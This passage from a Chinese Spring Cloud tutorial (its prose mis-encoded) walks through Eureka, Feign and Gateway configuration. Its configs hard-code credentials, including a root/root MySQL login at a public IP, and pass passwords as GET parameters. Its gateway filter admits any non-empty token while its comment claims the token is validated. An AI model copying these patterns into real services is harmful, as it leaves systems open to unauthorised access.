class="hljs-meta">service-url</span>:<span class="hljs-string"></span>      <span class="hljs-attr">defaultZone</span>: <span class="hljs-string">http://127.0.0.1:8761/eureka</span>    <span class="hljs-meta">register-with-eureka</span>: <span class="hljs-string">false</span>    <span class="hljs-meta">fetch-registry</span>: <span class="hljs-string">false</span><span class="hljs-attr">server</span>:<span class="hljs-string"></span>  <span class="hljs-attr">port</span>: <span class="hljs-string">8761</span><span class="hljs-attr">spring</span>:<span class="hljs-string"></span>  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>    <span class="hljs-attr">name</span>: <span class="hljs-string">eureka-server</span></code></pre></li><li><p>åœ¨é¡¹ç›®çš„å¯åŠ¨ç±»ä¸­æ·»åŠ æ³¨é‡Š<code>@EnableEurekaServer</code></p><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> com.qfedu.eureka.server;<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<span class="hljs-keyword">import</span> org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;<span class="hljs-meta">@SpringBootApplication</span><span class="hljs-meta">@EnableEurekaServer</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EurekaServerApplication</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        SpringApplication.run(EurekaServerApplication.class, args);    &#125;&#125;</code></pre></li><li><p>é…ç½®securityä¿¡æ¯</p><pre><code class="hljs properties"><span class="hljs-attr">spring</span>:<span class="hljs-string"></span>  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>    <span class="hljs-attr">name</span>: <span class="hljs-string">eureka-server</span>  <span class="hljs-attr">security</span>:<span class="hljs-string"></span>    <span class="hljs-attr">user</span>:<span class="hljs-string"></span>      <span class="hljs-attr">name</span>: <span class="hljs-string">sunzy</span>      <span class="hljs-attr">password</span>: <span class="hljs-string">111111</span></code></pre></li><li><p>é…ç½®springsecuity</p><pre><code class="hljs java">  ```### æ‹†åˆ†ç”¨æˆ·ç™»å½•æ¨¡å—- é¦–å…ˆåˆ›å»ºæ–°çš„æ¨¡å— api-user-login- å¯¼å…¥ä¾èµ–  ```xml  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;  &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;      &lt;scope&gt;test&lt;/scope&gt;  &lt;/dependency&gt;</code></pre></li></ul><ul><li><p>é…ç½®application.yml</p><pre><code class="hljs properties"><span class="hljs-attr">server</span>:<span class="hljs-string"></span>  <span class="hljs-attr">port</span>: <span class="hljs-string">8001</span><span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>    <span class="hljs-meta">service-url</span>:<span class="hljs-string"></span>      <span class="hljs-attr">defualtZone</span>: <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span><span class="hljs-attr">spring</span>:<span class="hljs-string"></span>  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>    <span class="hljs-attr">name</span>: <span class="hljs-string">api-user-login</span></code></pre></li><li><p>åœ¨å¯åŠ¨ç±»æ·»åŠ æ³¨è§£<code>@EnableDiscoveryClient</code>å’Œ<code>@EnableFeignClients</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.api;<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<span class="hljs-keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;<span class="hljs-keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;<span class="hljs-meta">@SpringBootApplication</span><span class="hljs-meta">@EnableDiscoveryClient</span><span class="hljs-meta">@EnableFeignClients</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiUserLoginApplication</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        SpringApplication.run(ApiUserLoginApplication.class, args);    &#125;&#125;</code></pre><p>æ·»åŠ æ³¨è§£åæ—¢å¯å¯åŠ¨æœåŠ¡ï¼Œåœ¨æ³¨å†Œä¸­å¿ƒä¸­å¯ä»¥çœ‹åˆ°æ³¨å†ŒæˆåŠŸçš„æœåŠ¡</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730224027994.png" alt="image-20220730224027994"></p></li></ul><h3 id="ç”¨æˆ·æŸ¥è¯¢æ¨¡å—"><a href="#ç”¨æˆ·æŸ¥è¯¢æ¨¡å—" class="headerlink" title="ç”¨æˆ·æŸ¥è¯¢æ¨¡å—"></a>ç”¨æˆ·æŸ¥è¯¢æ¨¡å—</h3><blockquote><p>è¯¥æ¨¡å—çš„ä¸»è¦çš„ä½œç”¨æ˜¯ä¸ºç™»å½•æä¾›ç”¨æˆ·æŸ¥è¯¢åŠŸèƒ½ï¼Œå› æ­¤æ¶‰åŠåˆ°æœåŠ¡è°ƒç”¨</p></blockquote><ul><li><p>é¦–å…ˆåˆ›å»ºæ¨¡å—user-check</p></li><li><p>pomæ–‡ä»¶å†…å®¹</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.qfedu<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>user-check<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>user-check<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">spring-cloud.version</span>&gt;</span>2021.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">spring-cloud.version</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.qfedu<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>common<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;spring-cloud.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre></li><li><p>application.yaml</p><pre><code class="hljs yaml"><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">9001</span><span class="hljs-attr">spring:</span>  <span class="hljs-attr">application:</span>    <span class="hljs-attr">name:</span> <span class="hljs-string">user-check</span>  <span class="hljs-attr">datasource:</span>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://81.68.252.36:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false</span>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>    <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><span class="hljs-attr">mybatis-plus:</span>  <span class="hljs-attr">global-config:</span>    <span class="hljs-attr">db-config:</span><span class="hljs-comment">#      table-prefix: tbl_</span>      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>  <span class="hljs-attr">configuration:</span> <span class="hljs-comment"># è®¾ç½®mybatisplusçš„æ—¥å¿—ä¸ºæ ‡å‡†è¾“å…¥æ ¼å¼ å¯ä»¥æ˜¾ç¤ºæ‰§è¡Œçš„sqlè¯­å¥ã€æºå¸¦çš„å‚æ•°ä¸æŸ¥è¯¢ç»“æœ</span>    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span><span class="hljs-attr">eureka:</span>  <span class="hljs-attr">client:</span>    <span class="hljs-attr">service-url:</span>      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span></code></pre></li><li><p>åœ¨å¯åŠ¨ç±»ä¸­æ·»åŠ æ³¨é‡Š<code>@EnableDiscoveryClient</code></p></li><li><p>serviceå’Œdaoå±‚ä»£ç ä¸ä¹‹å‰å†™å†…å®¹åŸºæœ¬ä¸€è‡´</p></li><li><p>åœ¨api-user-loginæ¨¡å—ä¸­è°ƒç”¨user-check</p><ul><li><p>åˆ›å»ºUserCheckClient</p><pre><code class="hljs java"><span class="hljs-meta">@FeignClient(value = &quot;user-check&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserCheckClient</span> </span>&#123;    <span class="hljs-meta">@GetMapping(&quot;user/check&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Users <span class="hljs-title">userCheck</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,<span class="hljs-meta">@RequestParam(&quot;password&quot;)</span> String password)</span></span>;&#125;</code></pre><p>å…¶ä¸­<code>@FeignClient(value = &quot;user-check&quot;)</code>ä¸­çš„valueè¦ä¸æ³¨å†Œåˆ°eurekaä¸­æœåŠ¡åç›¸åŒï¼Œ<code>@GetMapping(&quot;user/check&quot;)</code>è¦ä¸user-checkçš„controllerä¸­çš„è®¿é—®è·¯å¾„ç›¸åŒã€‚</p><p>æ–¹æ³•åä¹Ÿè¦ä¸controllerä¸­çš„æ–¹æ³•ç›¸åŒã€‚å¹¶ä¸”åœ¨æœ‰å¤šä¸ªå‚æ•°çš„æƒ…å†µä¸‹éœ€è¦åœ¨æ¯ä¸ªå‚æ•°å‰åŠ ä¸Š<code>@RequestParam(&quot;username&quot;)</code>ï¼Œå¦åˆ™feginè°ƒç”¨æ—¶ï¼Œä¼šå°†æ‰€æœ‰çš„å‚æ•°å½“æˆpostæ–¹å¼çš„è¯·æ±‚ä½“ï¼Œä»è€ŒæŠ¥é”™ã€‚</p><pre><code class="hljs less"><span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Users</span> <span class="hljs-selector-tag">userCheck</span>(<span class="hljs-variable">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) String username,<span class="hljs-variable">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) String password);</code></pre></li><li><p>api-user-loginåœ¨serviceä¸­è¿›è¡ŒæœåŠ¡è°ƒç”¨å³å¯</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.api.service.impl;<span class="hljs-keyword">import</span> com.qfedu.api.service.UserService;<span class="hljs-keyword">import</span> com.qfedu.api.service.fegin.UserCheckClient;<span class="hljs-keyword">import</span> com.qfedu.fmmall.beans.Users;<span class="hljs-keyword">import</span> com.qfedu.fmmall.vo.ResultVO;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserService</span> </span>&#123;    <span class="hljs-meta">@Qualifier(&quot;com.qfedu.api.service.fegin.UserCheckClient&quot;)</span>    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> UserCheckClient userCheckClient;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">checkLogin</span><span class="hljs-params">(String username, String password)</span> </span>&#123;        <span class="hljs-comment">// è°ƒç”¨å¦å¤–ä¸€ä¸ªæœåŠ¡ä»æ•°æ®åº“ä¸­æŸ¥è¯¢åˆ°ç”¨æˆ·ä¿¡æ¯</span>        Users users = userCheckClient.userCheck(username, password);        <span class="hljs-keyword">if</span>(users == <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;å¯†ç é”™è¯¯ï¼&quot;</span>);        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;null&quot;</span>.equals(users.getNickname()))&#123;            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;ç”¨æˆ·åä¸å­˜åœ¨ï¼&quot;</span>);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> ResultVO.success(users);        &#125;    &#125;&#125;</code></pre></li></ul></li></ul><h3 id="æ­å»ºgateway"><a href="#æ­å»ºgateway" class="headerlink" title="æ­å»ºgateway"></a>æ­å»ºgateway</h3><ul><li><p>åˆ›å»ºgatewayæœåŠ¡æ¨¡å—</p></li><li><p>pomæ–‡ä»¶å†…å®¹</p><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;parent&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;        &lt;version&gt;2.6.2&lt;/version&gt;        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;    &lt;/parent&gt;    &lt;groupId&gt;com.qfedu&lt;/groupId&gt;    &lt;artifactId&gt;gateway&lt;/artifactId&gt;    &lt;version&gt;2.1.1&lt;/version&gt;    &lt;name&gt;gateway&lt;/name&gt;    &lt;description&gt;Demo project for Spring Boot&lt;/description&gt;    &lt;properties&gt;        &lt;java.version&gt;1.8&lt;/java.version&gt;        &lt;spring-cloud.version&gt;2021.0.3&lt;/spring-cloud.version&gt;    &lt;/properties&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;io.projectreactor&lt;/groupId&gt;            &lt;artifactId&gt;reactor-test&lt;/artifactId&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;    &lt;dependencyManagement&gt;        &lt;dependencies&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;                &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;                &lt;type&gt;pom&lt;/type&gt;                &lt;scope&gt;import&lt;/scope&gt;            &lt;/dependency&gt;        &lt;/dependencies&gt;    &lt;/dependencyManagement&gt;    &lt;build&gt;        &lt;plugins&gt;            &lt;plugin&gt;                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;&lt;/project&gt;</code></pre></li><li><p>åœ¨application.ymlä¸­é…ç½®ç›¸å…³ä¿¡æ¯</p><pre><code class="hljs yaml"><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span><span class="hljs-attr">spring:</span>  <span class="hljs-attr">application:</span>    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway</span>  <span class="hljs-attr">cloud:</span>    <span class="hljs-attr">gateway:</span>      <span class="hljs-attr">routes:</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-service</span>          <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8001</span>          <span class="hljs-attr">predicates:</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/login</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">api-service</span>            <span class="hljs-attr">uri:</span> <span class="hljs-string">http://127.0.0.1:8002</span>            <span class="hljs-attr">predicates:</span>              <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/regist</span></code></pre></li><li><p>å®ç°å…¨å±€è¿‡æ»¤å™¨</p><blockquote><p>å½“ç”¨æˆ·è®¿é—®8000ç«¯å£æ—¶ï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šè¢«è¯¥è¿‡æ»¤å™¨æ‹¦æˆª</p><p>å› æ­¤å…¨å±€è¿‡æ»¤å™¨å¯ä»¥è¿›è¡Œæƒé™éªŒè¯</p></blockquote><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.gateway.filter;<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;<span class="hljs-keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;<span class="hljs-keyword">import</span> org.springframework.core.Ordered;<span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<span class="hljs-keyword">import</span> org.springframework.web.server.ServerWebExchange;<span class="hljs-keyword">import</span> reactor.core.publisher.Mono;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-meta">@Component</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyGlobalFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">GlobalFilter</span>, <span class="hljs-title">Ordered</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Mono&lt;Void&gt; <span class="hljs-title">filter</span><span class="hljs-params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> </span>&#123;        System.out.println(<span class="hljs-string">&quot;-------------------&quot;</span>);        System.out.println(<span class="hljs-string">&quot;è¿›å…¥å…¨å±€è¿‡æ»¤å™¨&quot;</span>);        List&lt;String&gt; token = exchange.getRequest().getHeaders().get(<span class="hljs-string">&quot;token&quot;</span>);        <span class="hljs-keyword">if</span>(token != <span class="hljs-keyword">null</span> &amp;&amp; token.size() &gt; <span class="hljs-number">0</span>)&#123;            <span class="hljs-comment">// å¯¹tokenè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœéªŒè¯é€šè¿‡åˆ™æ”¾è¡Œæœ¬æ¬¡æ‹¦æˆª</span>            <span class="hljs-keyword">return</span> chain.filter(exchange);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-comment">// éªŒè¯ä¸é€šè¿‡ï¼Œåˆ™è¿”å›å¯¹åº”çš„çŠ¶æ€ç </span>            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);            <span class="hljs-comment">// æ‹¦æˆªè¯·æ±‚</span>            <span class="hljs-keyword">return</span> exchange.getResponse().setComplete();        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getOrder</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;&#125;</code></pre></li><li><p>åŠ¨æ€è·¯ç”±é…ç½®</p><blockquote><p>ä½¿ç”¨æœåŠ¡æ³¨å†Œä¸å‘ç°å®ç°åŠ¨æ€è·¯ç”±</p></blockquote><ul><li><p>å°†gatewayæœåŠ¡æ¨¡å—åŠ å…¥åˆ°eurekaä¸­ï¼Œå³æ·»åŠ ä¾èµ–æ·»åŠ é…ç½®æ–‡ä»¶</p><pre><code class="hljs properties"><span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>    <span class="hljs-meta">service-url</span>:<span class="hljs-string"></span>      